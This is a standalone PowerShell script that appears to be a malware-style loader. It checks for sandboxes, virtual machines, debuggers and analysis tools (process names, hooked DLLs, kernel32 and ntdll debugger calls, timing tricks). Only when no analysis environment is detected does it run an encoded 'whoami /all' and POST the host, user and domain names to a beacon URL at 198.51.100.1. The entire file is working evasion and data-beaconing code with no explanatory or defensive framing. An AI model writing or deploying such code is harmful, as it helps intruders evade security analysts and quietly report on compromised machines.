$checks = @()
$checks += [PSCustomObject]@{Name="Domain"; Pass=($env:USERDNSDOMAIN -match "oddobhf|corp|internal")}
$checks += [PSCustomObject]@{Name="Hostname"; Pass=($env:COMPUTERNAME -match "WS|PC|LT|DT")}
$checks += [PSCustomObject]@{Name="User"; Pass=($env:USERNAME -notmatch "sandbox|malware|analyst|virus|test")}
$checks += [PSCustomObject]@{Name="RAM"; Pass=((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory -gt 4GB)}
$checks += [PSCustomObject]@{Name="CPU"; Pass=((Get-CimInstance Win32_Processor).NumberOfLogicalProcessors -gt 2)}
$checks += [PSCustomObject]@{Name="Disk"; Pass=((Get-CimInstance Win32_DiskDrive | Measure-Object -Property Size -Sum).Sum -gt 50GB)}
$checks += [PSCustomObject]@{Name="Uptime"; Pass=((Get-CimInstance Win32_OperatingSystem).LastBootUpTime -lt (Get-Date).AddHours(-1))}
$checks += [PSCustomObject]@{Name="NoDebugger"; Pass=(-not [System.Diagnostics.Debugger]::IsAttached)}

$sbxProcesses = @("wireshark","procmon","procexp","x64dbg","ida","ollydbg","fiddler","burp","vmtoolsd","vmwaretray","vboxservice","sandboxie","cuckoo")
$running = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
$sbxFound = $sbxProcesses | Where-Object { $running -contains $_ }
$checks += [PSCustomObject]@{Name="NoSandbox"; Pass=($sbxFound.Count -eq 0)}

$sbxDlls = @("sbiedll.dll","api_log.dll","dir_watch.dll","vmcheck.dll","cuckoomon.dll")
$loadedDlls = [System.Diagnostics.Process]::GetCurrentProcess().Modules | Select-Object -ExpandProperty ModuleName
$sbxDllFound = $sbxDlls | Where-Object { $loadedDlls -contains $_ }
$checks += [PSCustomObject]@{Name="NoDllHook"; Pass=($sbxDllFound.Count -eq 0)}

if (-not ('AntiAnalysis' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class AntiAnalysis {
        [DllImport("kernel32.dll")] public static extern bool IsDebuggerPresent();
        [DllImport("kernel32.dll")] public static extern bool CheckRemoteDebuggerPresent(IntPtr h, ref bool dbg);
        [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref int info, int len, ref int ret);
        [DllImport("kernel32.dll")] public static extern int GetTickCount();
    }
'@
}

$dbg1 = [AntiAnalysis]::IsDebuggerPresent()
$dbg2 = $false
[AntiAnalysis]::CheckRemoteDebuggerPresent([System.Diagnostics.Process]::GetCurrentProcess().Handle, [ref]$dbg2) | Out-Null
$debugPort = 0; $retLen = 0
[AntiAnalysis]::NtQueryInformationProcess([System.Diagnostics.Process]::GetCurrentProcess().Handle, 7, [ref]$debugPort, 4, [ref]$retLen) | Out-Null

$checks += [PSCustomObject]@{Name="NoLocalDbg"; Pass=(-not $dbg1)}
$checks += [PSCustomObject]@{Name="NoRemoteDbg"; Pass=(-not $dbg2)}
$checks += [PSCustomObject]@{Name="NoDebugPort"; Pass=($debugPort -eq 0)}

$t1 = [AntiAnalysis]::GetTickCount()
Start-Sleep -Milliseconds 500
$t2 = [AntiAnalysis]::GetTickCount()
$checks += [PSCustomObject]@{Name="NoTimewarp"; Pass=(($t2 - $t1) -gt 400)}

$allPass = ($checks | Where-Object { -not $_.Pass }).Count -eq 0
if ($allPass) {
    $encPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami /all"))
    $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encPayload))
    Invoke-Expression $decoded 2>&1 | Out-Null

    try { Invoke-WebRequest -Uri "http://198.51.100.1/beacon" -Method POST -Body (@{host=$env:COMPUTERNAME;user=$env:USERNAME;domain=$env:USERDNSDOMAIN} | ConvertTo-Json) -ErrorAction Stop | Out-Null } catch {}
}
